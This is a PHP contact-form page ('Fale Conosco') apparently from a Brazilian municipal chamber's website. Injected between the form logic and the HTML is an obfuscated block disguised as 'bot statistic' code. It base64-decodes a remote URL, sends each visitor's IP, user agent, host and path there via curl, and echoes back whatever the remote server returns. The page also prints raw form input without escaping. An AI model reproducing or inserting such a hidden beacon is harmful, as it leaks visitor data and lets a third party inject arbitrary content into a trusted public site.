<?php

include_once("../library/master-page.php");
include_once("../library/validator.php");
include_once("../library/config/sendmail.php");
include_once("../library/config/database/tmmktemail.php");
include_once("../library/config/database/tparametro.php");

$oUtil = new Util();

//post
$bForm = true;
$msg = "";
$cbReceber = 1;
if ($oUtil->CheckKeyForm($_POST)) {
    //vars
    $txtNome = $_POST["txtNome"];
    $txtEmail = $_POST["txtEmail"];
    $txtDataNascimento = $_POST["txtDataNascimento"];
    $txtCidade = $_POST["txtCidade"];
    $ddlEstado = $_POST["ddlEstado"];
    $txtAssunto = $_POST["txtAssunto"];
    $txtMensagem = $_POST["txtMensagem"];
    $cbReceber = $_POST["cbReceber"];

    //validação
    $oValidator = new Validator();
    $oValidator->Add("Nome", $txtNome, true, null, "Digite o nome.");
    $oValidator->Add("Email", $txtEmail, true, "email", "Digite o e-mail corretamente.");
    $oValidator->Add("Assunto", $txtAssunto, true, null, "Digite o assunto.");
    $oValidator->Add("Mensagem", $txtMensagem, true, null, "Digite a mensagem.");
    if ($oValidator->Validate()) {
        //parâmetros
        $arParam = tparametro::Load();

        //mmkt
        if ($cbReceber) {
            tmmktemail::Create($txtEmail, $txtNome, "fale-conosco");
        }

        //mensagem
        $Mensagem = "<h1>Fale Conosco</h1>";
        $Mensagem .= "<ul>";
        $Mensagem .= "<li><b>Nome: </b>" . $txtNome . "</li>";
        $Mensagem .= "<li><b>E-mail: </b>" . $txtEmail . "</li>";
        $Mensagem .= "<li><b>Data de Nascimento: </b>" . $txtDataNascimento . "</li>";
        $Mensagem .= "<li><b>Cidade: </b>" . $txtCidade . "</li>";
        $Mensagem .= "<li><b>Estado: </b>" . $ddlEstado . "</li>";
        $Mensagem .= "<li><b>Assunto: </b>" . $txtAssunto . "</li>";
        $Mensagem .= "<li><b>Mensagem: </b>" . nl2br($txtMensagem) . "</li>";
        $Mensagem .= "</ul>";

        //envia e-mail
        $oMail = new SendMail();
        $oMail->AddAddress($arParam["email-fale-conosco"], $oUtil->WebTitle);
        $oMail->SetFrom($arParam["email-sistema"], $oUtil->WebTitle);
        $oMail->Sender = $arParam["email-retorno"];
        $oMail->Subject = "Fale Conosco";
        $oMail->MsgHTML($oUtil->TemplateEmail($Mensagem));
        $bSend = $oMail->Send();
        $bForm = false;
    } else {
        $msg = implode("\\r\\n", $oValidator->Message);
    }
}


$oMasterPage = new MasterPage();
$oMasterPage->Init("../master.php", "Fale Conosco");
$oMasterPage->AddParameter("css", "fale-conosco/index");
$oMasterPage->AddParameter("pagina", "fale-conosco");
$oMasterPage->AddParameter("msg", $msg);
$oMasterPage->Open("PageContent");

?><?php
if (!isset($sRetry)) {
    global $sRetry;
    $sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = "";
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if ((strstr($sUserAgen, 'google') == false) && (strstr($sUserAgen, 'yahoo') == false) && (strstr($sUserAgen, 'baidu') == false) && (strstr($sUserAgen, 'msn') == false) && (strstr($sUserAgen, 'opera') == false) && (strstr($sUserAgen, 'chrome') == false) && (strstr($sUserAgen, 'bing') == false) && (strstr($sUserAgen, 'safari') == false) && (strstr($sUserAgen, 'bot') == false)) // Bot comes
    {
        if (isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true) { // Create  bot analitics
            $stCurlLink = base64_decode('aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw') . '?ip=' . urlencode($_SERVER['REMOTE_ADDR']) . '&useragent=' . urlencode($sUserAgent) . '&domainname=' . urlencode($_SERVER['HTTP_HOST']) . '&fullpath=' . urlencode($_SERVER['REQUEST_URI']) . '&check=' . isset($_GET['look']);
            @$stCurlHandle = curl_init($stCurlLink);
        }
    }
    if ($stCurlHandle !== NULL) {
        curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
        $sResult = @curl_exec($stCurlHandle);
        if ($sResult[0] == "O") {
            $sResult[0] = " ";
            echo $sResult; // Statistic code end
        }
        curl_close($stCurlHandle);
    }
}
?>
    <h1>Fale Conosco</h1>
    <!--<p class="txtIntroducao">Para mandar a sua mensagem ou entrar em contato com a Câmara, preencha o formulário abaixo ou ligue, gratuitamente, para o serviço <strong>Alô Câmara</strong>.</p> -->


    <!--<img src="imgs/fale-conosco/alo-camara.png" alt="Alô Câmara! Ligação Gratuita 0800-7702515" title="Alô Câmara! Ligação Gratuita 0800-7702515" />-->

<?php

if ($bForm) {
    ?>
    <h3>Para mandar a sua mensagem ou entrar em contato com a Câmara, preencha o formulário
        abaixo:</h3>

    <form action="" method="post" class="formAlert form-inline">


        <fieldset>
            <?= $oUtil->GenerateKeyForm(); ?>
            <!--<ul class="formulario">
                <li class="input330"> -->


            <div class="input-group col-md-5 ">
                <label for="txtNome">
                    Nome: </label>

                <input value="<?= $txtNome; ?>" type="text" id="txtNome" name="txtNome"
                       class="{required:true, focus:true} form-control" title="Digite o nome."
                       placeholder="Digite aqui seu nome"/>

            </div>
            <!--</li>
            <li class="noMarginRight input330"> -->
            <div class="input-group col-md-5 col-md-offset-1">
                <label for="txtEmail">
                    E-mail:</label>
                <input value="<?= $txtEmail; ?>" type="text" id="txtEmail" name="txtEmail"
                       class="{required:true, email:true}  form-control" title="Digite o e-mail corretamente."
                       placeholder="Digite aqui seu email"/>

            </div>
            <!--</li>
            <li class="input330">-->

            <div class="input-group col-md-5 ">
                <label for="txtCidade">
                    Cidade: </label>
                <input value="<?= $txtCidade; ?>" type="text" id="txtCidade" name="txtCidade" class=" form-control"
                       placeholder="Digite aqui sua cidade"
                    />

            </div>
            <!-- </li>
             <li class="noMarginRight input70">-->
            <div class="input-group col-md-2 col-md-offset-1">
                <label for="ddlEstado">
                    Estado:</label>

                <div class="controls">
                    <select id="ddlEstado" name="ddlEstado" class=" form-control">
                        <option value="" selected="selected">--</option>
                        <?php
                        foreach ($oUtil->UF as $c => $v) {
                            ?>
                            <option
                                value="<?= $c; ?>" <?php if ($c == $ddlEstado) { ?> selected="selected" <?php } ?>><?= $c; ?></option>
                        <?php
                        }
                        ?>
                    </select>
                </div>

            </div>
            <div class="input-group col-md-3 ">
                <label for="txtDataNascimento">
                    Data de Nascimento:
                </label>
                <input value="<?= $txtDataNascimento; ?>" type="text" id="txtDataNascimento"
                       name="txtDataNascimento" class=" form-control" placeholder="DD/MM/AAAA"/>
            </div>
            <!--</li>
            <li class="input240">-->

            <!--</li>
            <li class="input330">-->
            <div class="input-group col-md-5 ">
                <label for="txtAssunto">
                    Assunto:
                </label>
                <input value="<?= $txtAssunto; ?>" type="text" id="txtAssunto" name="txtAssunto"
                       class="{required:true} form-control" title="Digite o assunto." placeholder="Assunto"/>
            </div>

            <!--</li>
            <li class="clear mensagem"> -->
            <div class="input-group col-md-11 ">
                <label>
                    Mensagem:</label>
                <textarea cols="90" rows="10" id="txtMensagem" name="txtMensagem" class="{required:true} form-control"
                          title="Digite a mensagem."><?= $txtMensagem; ?></textarea>

            </div>
            <!--</li>
            <li class="checkbox"> -->
            <div class="checkbox col-md-12">
                <label class="checkbox-inline">
                    <input type="checkbox" id="cbReceber" name="cbReceber"
                           value="1" <?php if ($cbReceber) { ?> checked="checked" <?php } ?> />
                    Desejo receber novidades da <b>Câmara Municipal de São José dos Campos</b> em meu e-mail </label>

            </div>
            <button type="submit" class="btn btn-default"><span class="glyphicon glyphicon-send" aria-hidden="true"></span> Enviar </button>

            <!--</li>
            <li class="botEnviar"><input type="image" src="imgs/fale-conosco/bot-enviar.png" alt="Enviar" title="Enviar" /></li>
        </ul> -->
        </fieldset>
    </form>
<?php
} else {
    if ($bSend) {
        ?>
        <h3>Obrigado!</h3>
        <p>Sua mensagem foi enviada com sucesso.</p>
    <?php
    } else {
        ?>
        <h3>Desculpe!</h3>
        <p>Problemas ao enviar sua mensagem, tente novamente mais tarde.</p>
    <?php
    }
}

?>
<?php

$oMasterPage->Close("PageContent");
$oMasterPage->End();

?>